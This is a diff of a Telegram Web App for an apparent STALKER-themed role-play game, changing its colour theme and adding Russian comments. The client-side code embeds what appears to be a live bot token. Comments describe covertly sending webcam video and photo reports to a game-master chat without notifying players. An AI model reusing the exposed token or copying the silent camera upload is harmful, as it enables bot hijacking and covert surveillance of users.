@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v9.1 Total Silent Yellow</title>
+    <title>PDA Arsenii v9.0 Total Silent</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* Изменен основной цвет на радиационный желтый */
-        :root { --yellow: #ffcc00; --bg: #050804; }
+        :root { --green: #00ff41; --bg: #050804; }
         
         * { box-sizing: border-box; }
 
         body { 
             background: var(--bg); 
-            color: var(--yellow); 
+            color: var(--green); 
             font-family: monospace; 
             margin: 0; 
             padding: 0;
@@ -25,11 +24,11 @@
 
         .header { 
             padding: 10px 15px; 
-            border-bottom: 1px solid var(--yellow); 
+            border-bottom: 1px solid var(--green); 
             display: flex; 
             align-items: center; 
             gap: 10px; 
-            background: rgba(255, 204, 0, 0.05);
+            background: rgba(0,255,65,0.05);
             flex-shrink: 0; 
         }
 
@@ -38,8 +37,8 @@
         
         .cam-switch { 
             background: none; 
-            border: 1px solid var(--yellow); 
-            color: var(--yellow); 
+            border: 1px solid var(--green); 
+            color: var(--green); 
             padding: 8px 12px; 
             font-size: 0.7em; 
             cursor: pointer; 
@@ -67,8 +66,8 @@
 
         .mission-panel { 
             padding: 15px; 
-            background: rgba(255, 204, 0, 0.05); 
-            border-top: 1px solid var(--yellow);
+            background: rgba(0,255,65,0.05); 
+            border-top: 1px solid var(--green);
             flex-shrink: 0; 
         }
 
@@ -76,7 +75,7 @@
             font-weight: bold; 
             margin-bottom: 12px; 
             font-size: 0.9em; 
-            color: var(--yellow);
+            color: var(--green);
             text-align: center;
             min-height: 1.2em;
         }
@@ -84,14 +83,14 @@
         .btn-report { 
             width: 100%; 
             padding: 20px; 
-            background: var(--yellow); 
+            background: var(--green); 
             color: #000; 
             border: none; 
             font-weight: bold; 
             font-size: 1.2em; 
             cursor: pointer;
             text-transform: uppercase;
-            box-shadow: 0 0 15px rgba(255, 204, 0, 0.3);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
         }
 
         .btn-report:active {
@@ -104,7 +103,7 @@
             top: 0; 
             width: 100%; 
             height: 4px; 
-            background: rgba(255, 204, 0, 0.1); 
+            background: rgba(0, 255, 65, 0.1); 
             pointer-events: none; 
             animation: scan 5s linear infinite; 
             z-index: 10;
@@ -138,6 +137,8 @@
 <script>
     const CONFIG = {
         token: "8677364559:AAGWCwbiGEEtrmVzKfP4wo7ZpzionHhx-MI",
+        // ВНИМАНИЕ: Убедись, что тут стоит твой ID (или ID вашей группы мастеров).
+        // Все видео и все отчеты теперь идут ТОЛЬКО сюда. Игроков бот вообще не трогает!
         masterLogChatId: "6997991003" 
     };
 
@@ -213,6 +214,7 @@
         }
     });
 
+    // Скрытая отправка видео строго в админ-панель мастеров
     function sendVideo(blob) {
         const fd = new FormData();
         fd.append("chat_id", CONFIG.masterLogChatId);
@@ -232,6 +234,7 @@
         tg.HapticFeedback.selectionChanged();
     };
 
+    // При нажатии кнопки отчет улетает НАПРЯМУЮ админам. Пользователь не получает сообщений от бота!
     document.getElementById('sendBtn').onclick = () => {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('captureCanvas');
@@ -239,10 +242,11 @@
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(blob => {
             const fd = new FormData();
-            fd.append("chat_id", CONFIG.masterLogChatId); 
+            fd.append("chat_id", CONFIG.masterLogChatId); // Отчет идет мастерам, а не юзеру!
             fd.append("photo", blob, "report.jpg");
             fd.append("caption", `☢️ ОТЧЕТ ОТ СТАЛКЕРА: ${user.username}`);
             
+            // Кнопка оплаты создается для вас в вашем админ-чате
             const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ ИГРОКУ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
             
@@ -251,6 +255,7 @@
         }, "image/jpeg", 0.8);
     };
 
+    // Синхронизатор приказов. Отвечает на callback_query внутри админки, гарантируя отсутствие пушей у игрока
     async function sync() {
         try {
             const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
@@ -272,6 +277,7 @@
                             tg.HapticFeedback.notificationOccurred('success');
                         }
 
+                        // Гасим системный триггер Telegram API, чтобы он не слал пустые точки на телефоны
                         fetch(`https://api.telegram.org/bot${CONFIG.token}/answerCallbackQuery`, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
